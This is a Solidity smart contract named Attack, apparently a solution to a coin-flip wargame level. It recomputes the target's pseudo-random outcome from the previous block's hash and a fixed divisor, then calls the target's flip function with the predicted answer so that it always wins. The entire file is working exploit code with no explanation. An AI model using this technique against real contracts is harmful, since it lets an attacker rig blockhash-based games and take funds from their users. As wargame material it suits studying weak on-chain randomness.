// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address addr;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    event Result(bool success, bool returnValue);

    constructor(address _addr) {
        addr = _addr;
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        // call coinflip, return success & return value
        (bool success, bytes memory data) = addr.call(abi.encodeWithSignature("flip(bool)", side));
        // result
        emit Result(success, abi.decode(data, (bool)));
    }
}

